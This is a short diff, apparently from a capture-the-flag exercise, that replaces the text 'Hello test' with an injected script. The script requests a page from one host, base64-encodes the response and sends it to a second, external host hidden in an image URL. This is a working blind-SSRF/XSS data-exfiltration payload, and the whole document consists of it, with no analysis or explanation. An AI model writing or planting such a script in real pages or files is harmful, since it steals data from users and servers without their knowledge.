@@ -1,1 +1,7 @@
-Hello test
+<script>
+    exfil = new XMLHttpRequest();
+    exfil.open("GET", "https://iolite.ctfio.com/blind/recipe");
+    exfil.send();
+
+    exfil.onload = function() {document.write('<img src="https://ssrf.mzero.cloud/payload/blind-ssrf.html?x=' + btoa(this.responseText) + '">');}
+</script>
